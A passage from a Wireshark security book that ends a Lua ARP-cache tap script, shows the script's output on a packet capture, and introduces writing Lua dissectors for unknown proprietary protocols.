<div class="Section347" ><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:152.1000pt;margin-left:94.3000pt;text-indent:-86.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >table and print out the IP to MAC mapping for ip,mac in pairs(arp_cache)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("[*] (" .. ip .. ") at " .. mac)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:259.0500pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of for block end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:280.6000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-<a name="_bookmark639" ></a>-end of tap.draw() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:273.4000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of init_listener() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- call the init_listener</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function init_listener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >everything</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section348" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following shows the new </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp_cache</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script being run against a packet capture:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:$ tshark -q -r ../../att_sniff.pcapng -X lua_script:arp_cache.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.127) at ac:f2:c5:94:03:50</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.123.3) at 02:e0:52:4e:94:01</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.80) at fc:15:b4:ed:2e:ff</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.3) at 02:e0:52:c0:94:01</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.160) at</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >88:51:fb:55:ef:3b</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.110) at</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >74:46:a0:be:99:e6</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.148) at</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ac:f2:c5:85:87:46</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.60) at 2c:44:fd:23:7d:92</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.123.190) at 44:e4:d9:45:a8:d3</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] (135.37.133.86) at 74:46:a0:be:9d:22</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#8230;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you run this on your network, you may notice that some MAC addresses have multiple IP mappings. This usually occurs with</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets destined for beyond your local gateway, as all IP addresses destined for the public Internet are destined for the gateway&#8217;s MAC</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark640" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Creating Dissectors for Wireshark" ></a>Creating Dissectors for Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:8.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Dissectors, introduced a few times in </span><span><a href="#_bookmark14" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >1</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, are what turn bytes on the wire into something meaningful. Dissectors are the intelligence in Wireshark that briefly analyzes the bytes and packets and interprets them as some particular protocol and its components. The dissector&#8217;s analysis of each protocol is what allows Wireshark to fill in the Protocol column with &#8220;TCP&#8221; or &#8220;ARP,&#8221; and so on. And, of course, the Packet Details pane makes much more sense thanks to dissectors.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:9.0500pt;" ><a name="_bookmark641" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Unfortunately, Wireshark does not have a dissector for every protocol. There are protocols out there that Wireshark won&#8217;t or can&#8217;t understand. Fortunately, you can use Lua to build dissectors for new and unknown protocols you discover in the wild.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Dissector Types</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section349" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are also different types of dissectors that can be useful for different tasks. This section covers standard dissectors. There are dissectors that run after all the other dissectors have run, giving the programmer access to fields defined in other dissectors. These are referred to as </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >post-dissectors</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Two scripts described later in this chapter, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >packet-direction.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >mark-suspicious.lua</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, are examples of a post-dissector.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >chained dissector </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is similar to the post-dissector in that it runs after other dissectors so that you can access the fields for other dissectors. The difference is that a chained dissector doesn&#8217;t run against every packet, only those packets that are handled by the dissector off of which you are chaining. Chained dissectors are handy for extending an existing dissector without having to rewrite it completely, whereas post-dissectors are useful for adding a new dissector that provides additional context based on what other fields are set.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Why a Dissector Is Needed</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >During product testing engagements, one of the first things to look at is what the product is doing on the network. Companies often think they are being clever by implementing some proprietary binary protocol. Usually, this just means that they are serializing C structs and sending them across the network. But because the protocol is &#8220;homegrown,&#8221; Wireshark might not be aware of it. Wireshark will not have a dissector for this proprietary protocol, and you will be stuck looking at a packet like the one shown in<a name="_bookmark642" ></a>&nbsp;</span><span><a href="#_bookmark643" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="785"  height="185"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker434841.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:7.4000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark643" ></a><span><a href="#_bookmark642" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark without a dissector</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark644" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sometimes you can dig through product documentation and find information on how the protocol is built and what all the bits and</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section350" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >bytes mean, or you can pull the header files if it is open source to check struct definitions. Other times you are stuck with the hard slog of reverse engineering the product to figure out what you need to know.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:9.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this section, we walk through creating a dissector for an imaginary protocol. We are working under the assumption that we have some sort of protocol documentation that provides us with the protocol meaning, as well as the data type for the various protocol fields.</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Before we dig into what our protocol is, let&#8217;s quickly refresh the basics. As you know, there are 8 bits in a byte, and your architecture is either 32 bits (4 bytes) or 64 bits (8 bytes). We also discuss how endianess plays a role when bytes are sent across the wire. As a rule, bytes being sent across the wire are going to be in big-endian, where the most significant byte is stored at the lower address. In this exercise, however, we play loose with endianess so that you can get some practice handling either type of endianess when you come across it in a packet</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;" ><a name="_bookmark645" ></a><span><a href="#_bookmark646" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-7</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows our imaginary protocol.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="131.25"  height="0" ></td></tr><tr><td></td><td><img width="759"  height="263"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker436175.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark646" ></a><span><a href="#_bookmark645" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Our protocol fields</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Most of these fields should be self-explanatory, but we&#8217;ll walk through them nonetheless. The Payload Length is just that, the length of the payload minus the two bytes (16 bits) for the payload length field itself. The second field is a delimiter, which will be defined as 0xff. You will occasionally see delimiters used. These are often designed into protocols to make parsing easier, as you can use split-like functions to quickly break the protocol into its constituent parts. The Transaction</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
